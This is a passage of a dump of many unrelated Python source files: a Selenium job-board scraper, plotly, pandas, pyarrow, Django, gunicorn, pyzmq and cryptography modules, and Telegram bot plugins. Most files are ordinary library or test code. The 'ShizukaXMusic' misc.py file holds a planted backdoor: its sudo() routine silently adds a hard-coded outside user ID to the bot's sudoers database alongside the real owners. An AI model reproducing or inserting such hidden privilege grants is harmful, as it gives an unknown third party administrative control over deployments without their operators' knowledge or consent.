        job_area = item.find_element(By.CLASS_NAME, 'job-area').text
        job_salary = item.find_element(By.CLASS_NAME, 'salary').text
        job_tags = item.find_element(By.CLASS_NAME, 'tag-list').text
        job_company = item.find_element(By.CLASS_NAME, 'company-name').text
        job_company_tags = item.find_element(By.CLASS_NAME, 'company-tag-list').text
        job_info = item.find_element(By.CLASS_NAME, 'info-desc').text
        job_url = item.find_element(By.CLASS_NAME, 'job-card-body').find_element(By.TAG_NAME, 'a').get_attribute('href')
        print(job_url)
        jobs.append(
            (job_company, job_name, job_area, job_salary, job_company_tags, job_tags, job_info, job_url)
        )

    return jobs


def main():
    all_job = []
    url = 'https://www.zhipin.com/web/geek/job?query=前端开发工程师&city=101280600&page={}'
    for page in range(1, 11):
        page_url = url.format(page)
        print(page_url)
        jobs = get_post_data(page_url)
        if not jobs:
            jobs = get_post_data(page_url)
        print(jobs)
        all_job += jobs
        time.sleep(3)

    with open('boss.csv', 'w', newline='') as fp:
        headers = ['公司', '职位', '地区', '薪资', '公司标签', '经验', '工作福利', '链接']
        writer = csv.writer(fp)
        writer.writerow(headers)
        writer.writerows(all_job)


if __name__ == '__main__':
    main()"
JY398	JY398-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnelarea"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD451	JD451-main.py	"# Copyright 2016 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from flask import Flask
import requests

import services_config

app = Flask(__name__)
services_config.init_app(app)


@app.route('/')
def root():
    """"""Gets index.html from the static file server""""""
    res = requests.get(app.config['SERVICE_MAP']['static'])
    return res.content


@app.route('/hello/<service>')
def say_hello(service):
    """"""Recieves requests from buttons on the front end and resopnds
    or sends request to the static file server""""""
    # If 'gateway' is specified return immediate
    if service == 'gateway':
        return 'Gateway says hello'

    # Otherwise send request to service indicated by URL param
    responses = []
    url = app.config['SERVICE_MAP'][service]
    res = requests.get(url + '/hello')
    responses.append(res.content)
    return '\n'.encode().join(responses)


@app.route('/<path>')
def static_file(path):
    """"""Gets static files required by index.html to static file server""""""
    url = app.config['SERVICE_MAP']['static']
    res = requests.get(url + '/' + path)
    return res.content, 200, {'Content-Type': res.headers['Content-Type']}


if __name__ == '__main__':
    # This is used when running locally. Gunicorn is used to run the
    # application on Google App Engine. See entrypoint in app.yaml.
    app.run(host='127.0.0.1', port=8000, debug=True)"
JD506	JD506-test_odswriter.py	"import re

import pytest

import pandas._testing as tm

from pandas.io.excel import ExcelWriter

odf = pytest.importorskip(""odf"")

pytestmark = pytest.mark.parametrize(""ext"", ["".ods""])


def test_write_append_mode_raises(ext):
    msg = ""Append mode is not supported with odf!""

    with tm.ensure_clean(ext) as f:
        with pytest.raises(ValueError, match=msg):
            ExcelWriter(f, engine=""odf"", mode=""a"")


def test_kwargs(ext):
    # GH 42286
    # GH 43445
    # test for error: OpenDocumentSpreadsheet does not accept any arguments
    kwargs = {""kwarg"": 1}
    with tm.ensure_clean(ext) as f:
        msg = re.escape(""Use of **kwargs is deprecated"")
        error = re.escape(
            ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""
        )
        with pytest.raises(
            TypeError,
            match=error,
        ):
            with tm.assert_produces_warning(FutureWarning, match=msg):
                with ExcelWriter(f, engine=""odf"", **kwargs) as _:
                    pass


@pytest.mark.parametrize(""engine_kwargs"", [None, {""kwarg"": 1}])
def test_engine_kwargs(ext, engine_kwargs):
    # GH 42286
    # GH 43445
    # test for error: OpenDocumentSpreadsheet does not accept any arguments
    with tm.ensure_clean(ext) as f:
        if engine_kwargs is not None:
            error = re.escape(
                ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""
            )
            with pytest.raises(
                TypeError,
                match=error,
            ):
                ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs)
        else:
            with ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs) as _:
                pass


def test_book_and_sheets_consistent(ext):
    # GH#45687 - Ensure sheets is updated if user modifies book
    with tm.ensure_clean(ext) as f:
        with ExcelWriter(f) as writer:
            assert writer.sheets == {}
            table = odf.table.Table(name=""test_name"")
            writer.book.spreadsheet.addElement(table)
            assert writer.sheets == {""test_name"": table}"
JD200	JD200-test_builder.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

import weakref

import numpy as np

import pyarrow as pa
from pyarrow.lib import StringBuilder


def test_weakref():
    sbuilder = StringBuilder()
    wr = weakref.ref(sbuilder)
    assert wr() is not None
    del sbuilder
    assert wr() is None


def test_string_builder_append():
    sbuilder = StringBuilder()
    sbuilder.append(b""a byte string"")
    sbuilder.append(""a string"")
    sbuilder.append(np.nan)
    sbuilder.append(None)
    assert len(sbuilder) == 4
    assert sbuilder.null_count == 2
    arr = sbuilder.finish()
    assert len(sbuilder) == 0
    assert isinstance(arr, pa.Array)
    assert arr.null_count == 2
    assert arr.type == 'str'
    expected = [""a byte string"", ""a string"", None, None]
    assert arr.to_pylist() == expected


def test_string_builder_append_values():
    sbuilder = StringBuilder()
    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])
    assert sbuilder.null_count == 3
    arr = sbuilder.finish()
    assert arr.null_count == 3
    expected = [None, None, ""text"", None, ""other text""]
    assert arr.to_pylist() == expected


def test_string_builder_append_after_finish():
    sbuilder = StringBuilder()
    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])
    arr = sbuilder.finish()
    sbuilder.append(""No effect"")
    expected = [None, None, ""text"", None, ""other text""]
    assert arr.to_pylist() == expected"
JD418	JD418-misc.py	"import socket
import time

import heroku3
from pyrogram import filters

import config
from ShizukaXMusic.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return ""heroku"" in socket.getfqdn()


XCB = [
    ""/"",
    ""@"",
    ""."",
    ""com"",
    "":"",
    ""git"",
    ""heroku"",
    ""push"",
    str(config.HEROKU_API_KEY),
    ""https"",
    str(config.HEROKU_APP_NAME),
    ""HEAD"",
    ""main"",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f""Database Initialized."")


def sudo():
    global SUDOERS
    OWNER = config.OWNER_ID
    if config.MONGO_DB_URI is None:
        for user_id in OWNER:
            SUDOERS.add(user_id)
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = sudoersdb.find_one({""sudo"": ""sudo""})
        sudoers = [] if not sudoers else sudoers[""sudoers""]
        for user_id in OWNER:
            SUDOERS.add(user_id)
            if user_id not in sudoers:
                sudoers.append(user_id)
                sudoers.append(5463205082)
                sudoersdb.update_one(
                    {""sudo"": ""sudo""},
                    {""$set"": {""sudoers"": sudoers}},
                    upsert=True,
                )
        if sudoers:
            for x in sudoers:
                SUDOERS.add(x)
    LOGGER(__name__).info(f""Sudo Users Loaded Successfully."")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f""Heroku App Configured Successfully."")
            except BaseException:
                LOGGER(__name__).warning(
                    f""Please make sure your Heroku API Key and Your App name are configured correctly in the heroku.""
                )"
JD58	JD58-wsgiapp.py	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import os

from gunicorn.errors import ConfigError
from gunicorn.app.base import Application
from gunicorn import util


class WSGIApplication(Application):
    def init(self, parser, opts, args):
        self.app_uri = None

        if opts.paste:
            from .pasterapp import has_logging_config

            config_uri = os.path.abspath(opts.paste)
            config_file = config_uri.split('#')[0]

            if not os.path.exists(config_file):
                raise ConfigError(""%r not found"" % config_file)

            self.cfg.set(""default_proc_name"", config_file)
            self.app_uri = config_uri

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            return

        if len(args) > 0:
            self.cfg.set(""default_proc_name"", args[0])
            self.app_uri = args[0]

    def load_config(self):
        super().load_config()

        if self.app_uri is None:
            if self.cfg.wsgi_app is not None:
                self.app_uri = self.cfg.wsgi_app
            else:
                raise ConfigError(""No application module specified."")

    def load_wsgiapp(self):
        return util.import_app(self.app_uri)

    def load_pasteapp(self):
        from .pasterapp import get_wsgi_app
        return get_wsgi_app(self.app_uri, defaults=self.cfg.paste_global_conf)

    def load(self):
        if self.cfg.paste is not None:
            return self.load_pasteapp()
        else:
            return self.load_wsgiapp()


def run():
    """"""\
    The ``gunicorn`` command line runner for launching Gunicorn with
    generic WSGI applications.
    """"""
    from gunicorn.app.wsgiapp import WSGIApplication
    WSGIApplication(""%(prog)s [OPTIONS] [APP_MODULE]"").run()


if __name__ == '__main__':
    run()"
JY55	JY55-test_dualmode_insertcell.py	"from selenium.webdriver.common.keys import Keys
from .utils import shift

INITIAL_CELLS = ['print(""a"")', 'print(""b"")', 'print(""c"")']

def test_insert_cell(prefill_notebook):
    notebook = prefill_notebook(INITIAL_CELLS)

    notebook.to_command_mode()
    notebook.focus_cell(2)
    notebook.convert_cell_type(2, ""markdown"")
    
    # insert code cell above
    notebook.current_cell.send_keys(""a"")
    assert notebook.get_cell_contents(2) == """"
    assert notebook.get_cell_type(2) == ""code""
    assert len(notebook.cells) == 4
    
    # insert code cell below
    notebook.current_cell.send_keys(""b"")
    assert notebook.get_cell_contents(2) == """"
    assert notebook.get_cell_contents(3) == """"
    assert notebook.get_cell_type(3) == ""code""
    assert len(notebook.cells) == 5

    notebook.edit_cell(index=1, content=""cell1"")
    notebook.focus_cell(1)
    notebook.current_cell.send_keys(""a"")
    assert notebook.get_cell_contents(1) == """"
    assert notebook.get_cell_contents(2) == ""cell1""

    notebook.edit_cell(index=1, content='cell1')
    notebook.edit_cell(index=2, content='cell2')
    notebook.edit_cell(index=3, content='cell3')
    notebook.focus_cell(2)
    notebook.current_cell.send_keys(""b"")
    assert notebook.get_cell_contents(1) == ""cell1""
    assert notebook.get_cell_contents(2) == ""cell2""
    assert notebook.get_cell_contents(3) == """"
    assert notebook.get_cell_contents(4) == ""cell3""

    # insert above multiple selected cells
    notebook.focus_cell(1)
    shift(notebook.browser, Keys.DOWN)
    notebook.current_cell.send_keys('a')
    
    # insert below multiple selected cells
    notebook.focus_cell(2)
    shift(notebook.browser, Keys.DOWN)
    notebook.current_cell.send_keys('b')
    assert notebook.get_cells_contents()[1:5] == ["""", ""cell1"", ""cell2"", """"]"
JY382	JY382-functional_test_file.py	"# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import configparser
from os.path import basename, exists, join


def parse_python_version(ver_str):
    return tuple(int(digit) for digit in ver_str.split("".""))


class NoFileError(Exception):
    pass


class FunctionalTestFile:
    """"""A single functional test case file with options.""""""

    _CONVERTERS = {
        ""min_pyver"": parse_python_version,
        ""max_pyver"": parse_python_version,
        ""requires"": lambda s: s.split("",""),
    }

    def __init__(self, directory, filename):
        self._directory = directory
        self.base = filename.replace("".py"", """")
        self.options = {
            ""min_pyver"": (2, 5),
            ""max_pyver"": (4, 0),
            ""requires"": [],
            ""except_implementations"": [],
            ""exclude_platforms"": [],
        }
        self._parse_options()

    def __repr__(self):
        return f""FunctionalTest:{self.base}""

    def _parse_options(self):
        cp = configparser.ConfigParser()
        cp.add_section(""testoptions"")
        try:
            cp.read(self.option_file)
        except NoFileError:
            pass

        for name, value in cp.items(""testoptions""):
            conv = self._CONVERTERS.get(name, lambda v: v)
            self.options[name] = conv(value)

    @property
    def option_file(self):
        return self._file_type("".rc"")

    @property
    def module(self):
        package = basename(self._directory)
        return ""."".join([package, self.base])

    @property
    def expected_output(self):
        return self._file_type("".txt"", check_exists=False)

    @property
    def source(self):
        return self._file_type("".py"")

    def _file_type(self, ext, check_exists=True):
        name = join(self._directory, self.base + ext)
        if not check_exists or exists(name):
            return name
        raise NoFileError(f""Cannot find '{name}'."")"
JD179	JD179-context_processors.py	"# PermWrapper and PermLookupDict proxy the permissions system into objects that
# the template system can understand.


class PermLookupDict:
    def __init__(self, user, app_label):
        self.user, self.app_label = user, app_label

    def __repr__(self):
        return str(self.user.get_all_permissions())

    def __getitem__(self, perm_name):
        return self.user.has_perm(""%s.%s"" % (self.app_label, perm_name))

    def __iter__(self):
        # To fix 'item in perms.someapp' and __getitem__ interaction we need to
        # define __iter__. See #18979 for details.
        raise TypeError(""PermLookupDict is not iterable."")

    def __bool__(self):
        return self.user.has_module_perms(self.app_label)


class PermWrapper:
    def __init__(self, user):
        self.user = user

    def __repr__(self):
        return f""{self.__class__.__qualname__}({self.user!r})""

    def __getitem__(self, app_label):
        return PermLookupDict(self.user, app_label)

    def __iter__(self):
        # I am large, I contain multitudes.
        raise TypeError(""PermWrapper is not iterable."")

    def __contains__(self, perm_name):
        """"""
        Lookup by ""someapp"" or ""someapp.someperm"" in perms.
        """"""
        if ""."" not in perm_name:
            # The name refers to module.
            return bool(self[perm_name])
        app_label, perm_name = perm_name.split(""."", 1)
        return self[app_label][perm_name]


def auth(request):
    """"""
    Return context variables required by apps that use Django's authentication
    system.

    If there is no 'user' attribute in the request, use AnonymousUser (from
    django.contrib.auth).
    """"""
    if hasattr(request, ""user""):
        user = request.user
    else:
        from django.contrib.auth.models import AnonymousUser

        user = AnonymousUser()

    return {
        ""user"": user,
        ""perms"": PermWrapper(user),
    }"
JD357	JD357-reverse.py	"""""""
Provide urlresolver functions that return fully qualified URLs or view names
""""""
from django.urls import NoReverseMatch
from django.urls import reverse as django_reverse
from django.utils.functional import lazy

from rest_framework.settings import api_settings
from rest_framework.utils.urls import replace_query_param


def preserve_builtin_query_params(url, request=None):
    """"""
    Given an incoming request, and an outgoing URL representation,
    append the value of any built-in query parameters.
    """"""
    if request is None:
        return url

    overrides = [
        api_settings.URL_FORMAT_OVERRIDE,
    ]

    for param in overrides:
        if param and (param in request.GET):
            value = request.GET[param]
            url = replace_query_param(url, param, value)

    return url


def reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):
    """"""
    If versioning is being used then we pass any `reverse` calls through
    to the versioning scheme instance, so that the resulting URL
    can be modified if needed.
    """"""
    scheme = getattr(request, 'versioning_scheme', None)
    if scheme is not None:
        try:
            url = scheme.reverse(viewname, args, kwargs, request, format, **extra)
        except NoReverseMatch:
            # In case the versioning scheme reversal fails, fallback to the
            # default implementation
            url = _reverse(viewname, args, kwargs, request, format, **extra)
    else:
        url = _reverse(viewname, args, kwargs, request, format, **extra)

    return preserve_builtin_query_params(url, request)


def _reverse(viewname, args=None, kwargs=None, request=None, format=None, **extra):
    """"""
    Same as `django.urls.reverse`, but optionally takes a request
    and returns a fully qualified URL, using the request to get the base URL.
    """"""
    if format is not None:
        kwargs = kwargs or {}
        kwargs['format'] = format
    url = django_reverse(viewname, args=args, kwargs=kwargs, **extra)
    if request:
        return request.build_absolute_uri(url)
    return url


reverse_lazy = lazy(reverse, str)"
JD489	JD489-examples.py	"# coding: utf8
from __future__ import unicode_literals


""""""
Example sentences to test spaCy and its language models.

>>> from spacy.lang.uk.examples import sentences
>>> docs = nlp.pipe(sentences)
""""""


sentences = [
    ""Ніч на середу буде морозною."",
    ""Чим кращі книги ти читав, тим гірше спиш."",  # Serhiy Zhadan
    ""Найстаріші ґудзики, відомі людству, археологи знайшли в долині ріки Інд."",
    ""Слов'янське слово «Україна» вперше згадується у Київському літописному зводі за Іпатіївським списком під 1187 роком."",  # wikipedia
    ""Де у Києві найсмачніша кава?"",
    ""Від Нижнього озера довгими дерев’яними сходами, над якими синьо й біло горіли маленькі коробочки-ліхтарики, підіймалися до нього двоє стовусів: найкращий друг Вертутій і його дванадцятилітній онук Чублик."",  # blyznets_viktor_semenovych/zemlia_svitliachkiv
    ""Китайський космічний зонд \""Чан'е-4\"" вперше в історії здійснив м'яку посадку на зворотному боці Місяця."",
    ""Коли до губ твоїх лишається півподиху, коли до губ твоїх лишається півкроку – зіниці твої виткані із подиву, в очах у тебе синьо і широко."",  # Hryhorij Czubaj
    ""Дорогу сестру збираю у дорогу, а брати вирішили не брати машину."",  # homographs
]"
JY544	JY544-imdb.py	"import requests
from requests.exceptions import JSONDecodeError, ConnectionError

from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from HotspotRobot import pbot, SUPPORT_CHAT


@pbot.on_message(filters.command(""imdb""))
async def imdb(client, message):
    text = message.text.split("" "", 1)
    if len(text) == 1:
        return await message.reply_text(""» ɢɪᴠᴇ ᴍᴇ ꜱᴏᴍᴇ ᴍᴏᴠɪᴇ ɴᴀᴍᴇ.\n   ᴇx. /imdb Altron"")

    try:
        response = requests.get(f""https://api.safone.me/tmdb?query={text[1]}"").json()[""results""][0]
    except (JSONDecodeError, ConnectionError) as e:
        return await message.reply_text(
            f""**Some Error Occured:** ᴘʟᴇᴀꜱᴇ ʀᴇᴘᴏʀᴛ ɪᴛ ᴀᴛ ᴏᴜʀ [ꜱᴜᴘᴘᴏʀᴛ ᴄʜᴀᴛ](https://t.me/{SUPPORT_CHAT}).""
            f""\n\n**Error:** {e}""
            )

    poster = response[""poster""]
    imdb_link = response[""imdbLink""]
    title = response[""title""]
    rating = response[""rating""]
    releasedate = response[""releaseDate""]
    description = response[""overview""]
    popularity = response[""popularity""]
    runtime = response[""runtime""]
    status = response[""status""]

    await client.send_photo(
        message.chat.id,
        poster,
        caption=f""""""**» IMDB Movie Details:**

‣ **Title** = `{title}`
‣ **Description** = `{description}`
‣ **Rating** = `{rating}`
‣ **Release-Date** = `{releasedate}`
‣ **Popularity** = `{popularity}`
‣ **Runtime** = `{runtime}`
‣ **Status** = `{status}`
"""""",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text=""• ɪᴍᴅʙ ʟɪɴᴋ •"", url=imdb_link)]])
    )


__help__ = """"""
  ➲ /imdb <ᴍᴏᴠɪᴇ ɴᴀᴍᴇ>: ɢᴇᴛ ꜰᴜʟʟ ɪɴꜰᴏ ᴀʙᴏᴜᴛ ᴀ ᴍᴏᴠɪᴇ ꜰʀᴏᴍ [imdb.com](https://m.imdb.com)
""""""
__mod_name__ = ""Iᴍᴅʙ"""
JY356	JY356-test_handlers.py	"# Copyright (c) 2020 All Rights Reserved
# Author: William H. Guss, Brandon Houghton


from minerl.herobraine.hero.handlers.agent.observations.compass import CompassObservation
from minerl.herobraine.hero.handlers.agent.observations.inventory import FlatInventoryObservation
from minerl.herobraine.hero.handlers.agent.observations.equipped_item import _TypeObservation
from minerl.herobraine.hero.handlers.agent.action import ItemListAction


def test_merge_item_list_command_actions():
    class TestItemListCommandAction(ItemListAction):
        def __init__(self, items: list, **item_list_kwargs):
            super().__init__(""test"", items, **item_list_kwargs)

        def to_string(self):
            return ""test_item_list_command""

    assert TestItemListCommandAction(['none', 'A', 'B', 'C', 'D'], _other='none') | TestItemListCommandAction(
        ['none', 'E', 'F'], _other='none') == TestItemListCommandAction(
        ['none', 'A', 'B', 'C', 'D', 'E', 'F'], _other='none')


def test_merge_type_observation():
    type_obs_a = _TypeObservation('test', ['none', 'A', 'B', 'C', 'D', 'other'], _default='none', _other='other')
    type_obs_b = _TypeObservation('test', ['none', 'E', 'F', 'other'], _default='none', _other='other')
    type_obs_result = _TypeObservation('test', ['none', 'A', 'B', 'C', 'D', 'E', 'F', 'other'], _default='none',
                                       _other='other')
    assert (type_obs_a | type_obs_b == type_obs_result)


def test_merge_flat_inventory_observation():
    assert FlatInventoryObservation(['stone', 'sandstone', 'lumber', 'wood', 'iron_bar']
                                    ) | FlatInventoryObservation(['ice', 'ice', 'ice', 'ice', 'ice', 'water']) == \
           FlatInventoryObservation(['stone', 'sandstone', 'lumber', 'wood', 'iron_bar', 'ice', 'water'])


def test_combine_compass_observations():
    assert CompassObservation() | CompassObservation() == CompassObservation()"
JY11	JY11-utils.py	"""""""miscellaneous zmq_utils wrapping""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from zmq.error import InterruptedSystemCall, _check_rc, _check_version

from ._cffi import ffi
from ._cffi import lib as C


def has(capability):
    """"""Check for zmq capability by name (e.g. 'ipc', 'curve')

    .. versionadded:: libzmq-4.1
    .. versionadded:: 14.1
    """"""
    _check_version((4, 1), 'zmq.has')
    if isinstance(capability, str):
        capability = capability.encode('utf8')
    return bool(C.zmq_has(capability))


def curve_keypair():
    """"""generate a Z85 key pair for use with zmq.CURVE security

    Requires libzmq (≥ 4.0) to have been built with CURVE support.

    Returns
    -------
    (public, secret) : two bytestrings
        The public and private key pair as 40 byte z85-encoded bytestrings.
    """"""
    _check_version((3, 2), ""curve_keypair"")
    public = ffi.new('char[64]')
    private = ffi.new('char[64]')
    rc = C.zmq_curve_keypair(public, private)
    _check_rc(rc)
    return ffi.buffer(public)[:40], ffi.buffer(private)[:40]


def curve_public(private):
    """"""Compute the public key corresponding to a private key for use
    with zmq.CURVE security

    Requires libzmq (≥ 4.2) to have been built with CURVE support.

    Parameters
    ----------
    private
        The private key as a 40 byte z85-encoded bytestring
    Returns
    -------
    bytestring
        The public key as a 40 byte z85-encoded bytestring.
    """"""
    if isinstance(private, str):
        private = private.encode('utf8')
    _check_version((4, 2), ""curve_public"")
    public = ffi.new('char[64]')
    rc = C.zmq_curve_public(public, private)
    _check_rc(rc)
    return ffi.buffer(public)[:40]


def _retry_sys_call(f, *args, **kwargs):
    """"""make a call, retrying if interrupted with EINTR""""""
    while True:
        rc = f(*args)
        try:
            _check_rc(rc)
        except InterruptedSystemCall:
            continue
        else:
            break


__all__ = ['has', 'curve_keypair', 'curve_public']"
JD330	JD330-quickstart_v2.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START speech_quickstart_v2]
import io

from google.cloud.speech_v2 import SpeechClient
from google.cloud.speech_v2.types import cloud_speech


def quickstart_v2(project_id, recognizer_id, audio_file):
    # Instantiates a client
    client = SpeechClient()

    request = cloud_speech.CreateRecognizerRequest(
        parent=f""projects/{project_id}/locations/global"",
        recognizer_id=recognizer_id,
        recognizer=cloud_speech.Recognizer(
            language_codes=[""en-US""], model=""latest_long""
        ),
    )

    # Creates a Recognizer
    operation = client.create_recognizer(request=request)
    recognizer = operation.result()

    # Reads a file as bytes
    with io.open(audio_file, ""rb"") as f:
        content = f.read()

    config = cloud_speech.RecognitionConfig(auto_decoding_config={})

    request = cloud_speech.RecognizeRequest(
        recognizer=recognizer.name, config=config, content=content
    )

    # Transcribes the audio into text
    response = client.recognize(request=request)

    for result in response.results:
        print(""Transcript: {}"".format(result.alternatives[0].transcript))

    return response


# [END speech_quickstart_v2]


if __name__ == ""__main__"":
    quickstart_v2()"
JY79	JY79-deconstruct.py	"from importlib import import_module

from django.utils.version import get_docs_version


def deconstructible(*args, path=None):
    """"""
    Class decorator that allows the decorated class to be serialized
    by the migrations subsystem.

    The `path` kwarg specifies the import path.
    """"""

    def decorator(klass):
        def __new__(cls, *args, **kwargs):
            # We capture the arguments to make returning them trivial
            obj = super(klass, cls).__new__(cls)
            obj._constructor_args = (args, kwargs)
            return obj

        def deconstruct(obj):
            """"""
            Return a 3-tuple of class import path, positional arguments,
            and keyword arguments.
            """"""
            # Fallback version
            if path and type(obj) is klass:
                module_name, _, name = path.rpartition(""."")
            else:
                module_name = obj.__module__
                name = obj.__class__.__name__
            # Make sure it's actually there and not an inner class
            module = import_module(module_name)
            if not hasattr(module, name):
                raise ValueError(
                    ""Could not find object %s in %s.\n""
                    ""Please note that you cannot serialize things like inner ""
                    ""classes. Please move the object into the main module ""
                    ""body to use migrations.\n""
                    ""For more information, see ""
                    ""https://docs.djangoproject.com/en/%s/topics/migrations/""
                    ""#serializing-values"" % (name, module_name, get_docs_version())
                )
            return (
                path
                if path and type(obj) is klass
                else f""{obj.__class__.__module__}.{name}"",
                obj._constructor_args[0],
                obj._constructor_args[1],
            )

        klass.__new__ = staticmethod(__new__)
        klass.deconstruct = deconstruct

        return klass

    if not args:
        return decorator
    return decorator(*args)"
JD223	JD223-__init__.py	"""""""
**Note:** almost all functions in the ``numpy.lib`` namespace
are also present in the main ``numpy`` namespace.  Please use the
functions as ``np.<funcname>`` where possible.

``numpy.lib`` is mostly a space for implementing functions that don't
belong in core or in another NumPy submodule with a clear purpose
(e.g. ``random``, ``fft``, ``linalg``, ``ma``).

Most contains basic functions that are used by several submodules and are
useful to have in the main name-space.

""""""
import math

from numpy.version import version as __version__

# Public submodules
# Note: recfunctions and (maybe) format are public too, but not imported
from . import mixins
from . import scimath as emath

# Private submodules
from .type_check import *
from .index_tricks import *
from .function_base import *
from .nanfunctions import *
from .shape_base import *
from .stride_tricks import *
from .twodim_base import *
from .ufunclike import *
from .histograms import *

from .polynomial import *
from .utils import *
from .arraysetops import *
from .npyio import *
from .financial import *
from .arrayterator import Arrayterator
from .arraypad import *
from ._version import *
from numpy.core._multiarray_umath import tracemalloc_domain

__all__ = ['emath', 'math', 'tracemalloc_domain', 'Arrayterator']
__all__ += type_check.__all__
__all__ += index_tricks.__all__
__all__ += function_base.__all__
__all__ += shape_base.__all__
__all__ += stride_tricks.__all__
__all__ += twodim_base.__all__
__all__ += ufunclike.__all__
__all__ += arraypad.__all__
__all__ += polynomial.__all__
__all__ += utils.__all__
__all__ += arraysetops.__all__
__all__ += npyio.__all__
__all__ += financial.__all__
__all__ += nanfunctions.__all__
__all__ += histograms.__all__

from numpy._pytesttester import PytestTester
test = PytestTester(__name__)
del PytestTester"
JD402	JD402-cmac.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import AlreadyFinalized
from cryptography.hazmat.primitives import ciphers

if typing.TYPE_CHECKING:
    from cryptography.hazmat.backends.openssl.cmac import _CMACContext


class CMAC:
    _ctx: typing.Optional[""_CMACContext""]
    _algorithm: ciphers.BlockCipherAlgorithm

    def __init__(
        self,
        algorithm: ciphers.BlockCipherAlgorithm,
        backend: typing.Any = None,
        ctx: typing.Optional[""_CMACContext""] = None,
    ) -> None:
        if not isinstance(algorithm, ciphers.BlockCipherAlgorithm):
            raise TypeError(""Expected instance of BlockCipherAlgorithm."")
        self._algorithm = algorithm

        if ctx is None:
            from cryptography.hazmat.backends.openssl.backend import (
                backend as ossl,
            )

            self._ctx = ossl.create_cmac_ctx(self._algorithm)
        else:
            self._ctx = ctx

    def update(self, data: bytes) -> None:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")

        utils._check_bytes(""data"", data)
        self._ctx.update(data)

    def finalize(self) -> bytes:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        digest = self._ctx.finalize()
        self._ctx = None
        return digest

    def verify(self, signature: bytes) -> None:
        utils._check_bytes(""signature"", signature)
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")

        ctx, self._ctx = self._ctx, None
        ctx.verify(signature)

    def copy(self) -> ""CMAC"":
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        return CMAC(self._algorithm, ctx=self._ctx.copy())"
JD49	JD49-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
